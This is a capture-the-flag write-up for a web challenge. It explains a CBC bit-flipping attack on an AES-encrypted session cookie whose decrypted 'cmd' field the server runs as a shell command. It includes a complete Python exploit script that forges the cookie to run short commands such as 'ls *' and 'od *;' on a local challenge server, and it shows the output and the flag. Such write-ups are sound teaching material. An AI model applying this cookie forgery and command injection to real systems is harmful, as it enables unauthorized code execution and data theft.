# Flippin' Awesome Writeup
The site lets you log in with a username. When logging in, we are greeted with
a message like the following:

```
Welcome, test! Here's the time: Thu Feb 28 13:06:55 CET 2019
```

The first thing that stands out is the time printing. It looks an awful lot like
the output of the `date` command. Keep this in mind for later.

Reading the source code, we can see that the cookie is encrypted using AES-CBC.
The cookie format looks like this:
```
{"cmd": "echo \"Welcome, test!\nHere's the time: $(date)\"", "username": "test"}
```

Now we know that the time output actually comes from the `date` command.

When we visit the `/motd` page with a valid cookie, the cookie is decrypted and
the `cmd` field is run using `subprocess.check_output()`. If we can somehow
control this data, we can run arbitrary commands on the system! Unfortunately
for us, the username is sanitized using `sanitize_username()` before it's
stored. So there's no way to do command injection using the username field.

One possibility, however, is to use a CBC bit flipping attack! See
[this](https://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#gref)
post for a nice and detailed description of the attack.

The cookie data has to be valid JSON when decrypted, so we can only change the
first block of the ciphertext. The reason for this is that the IV is prepended,
so we can flip bits there without corrupting parts of the JSON data.

Let's take a look at the first block, where we can flip bits.

```
{"cmd": "echo \\"
```

The command and the JSON data still has to parse correctly, so we can't simply
remove the escape character or the quotation mark.

We can start by running a very short command, though, just to see that it works.
The following code is based on [this](https://ctftime.org/writeup/11811)
writeup. However, we have added usage of the `requests` module to automatically
set the cookie and visit the `/motd` page.

```python
from base64 import b64decode, b64encode
from binascii import hexlify
from hashlib import md5
from Crypto.Cipher import AES
from Crypto import Random
import requests
from bs4 import BeautifulSoup
import re

motd = "0duSaqOSkgmu8BPSALSp3V9bOKJZ3HmuzlCcMddW94vjHWPjVrpHkB46IISXZpDFpd19cMLCRiqUZI+NmK7kmpcmsd4y3If/27AMA/hHQ9wfJMu4WOs8FPBCMdGLq3ahJWNNV/qPDQNa4k2szCIdPQ=="


BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class AESCipher:
    """
    Usage:
        c = AESCipher('password').encrypt('message')
        m = AESCipher('password').decrypt(c)
    Tested under Python 3 and PyCrypto 2.6.1.
    """

    def __init__(self, key):
        self.key = md5(key.encode('utf8')).hexdigest()
        self.iv = "\x00" * BLOCK_SIZE

    def encrypt(self, raw):
        raw = pad(raw)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return b64encode(cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return unpad(cipher.decrypt(enc)) #.decode('utf8')

# https://ctftime.org/writeup/11811
def xor(a, b):
    """
    return a bytearray constructed by XORing a and b
    """
    out = bytearray()
    for i,c in enumerate(a):
        out.append(c ^ b[i])
    return bytes(out)


def construct_cookie(cookie_value):
    # current and desired plaintext, obtained by observing the cookie
    current_plaintext = bytearray('{"cmd": "echo \\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "ls * \\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "pwd ;\\"', 'utf8')
    desired_plaintext = bytearray('{"cmd": "od *;\\"', 'utf8')
    #desired_plaintext = bytearray('{"cmd": "cat *; ', 'utf8')

    # base64-decode the cookie value
    decoded_cookie = b64decode(cookie_value)
    # split the IV and the message
    original_iv = decoded_cookie[:16]
    # construct the mask for the first block
    desired_iv = xor(xor(desired_plaintext, current_plaintext), bytearray(original_iv))
    # prepend the new IV to the original ciphertext
    altered_ciphertext = desired_iv+decoded_cookie[16:]
    # base64-encode the cookie value
    cookie = b64encode(altered_ciphertext).decode("utf8")
    return cookie

cookie = construct_cookie(motd)
print(cookie)

r = requests.get('http://localhost:5000/motd', cookies=cookies)
print(r.status_code)
print("Response:")

soup = BeautifulSoup(r.text, "html.parser")
text = re.sub(r'\n\s*\n', r'\n\n', soup.get_text().strip(), flags=re.M)
print(text)
```

Running it yields the following output:
```
$ python3 win.py
200
Response:
flag.txt
server.py
templates
/bin/sh: 2: Welcome, aaaaa!
Here's the time: Thu Feb 28 13:21:26 CET 2019: not found
```

Nice, the flag is right there! Now, we just need to find a very short command
that allows us to read the flag file. One such command is `od`.

We can change `echo \\"` to `od *;\\"` and we will still have a valid string
inside the command, and valid JSON data. You might notice that the output from
`od` looks really weird, though. So we added some code to the solution script to
parse the output from `od` and turn it back into a normal string again.

See the top-voted answer
[here](https://unix.stackexchange.com/questions/8502/how-is-the-octal-2-byte-output-calculated-from-od)
for an explanation of the output format.

```bash
$ python3 win.py
200
Response:
	[ tons of output ]
flag: TG19{thank_you_for_flipping_some_bits}
```
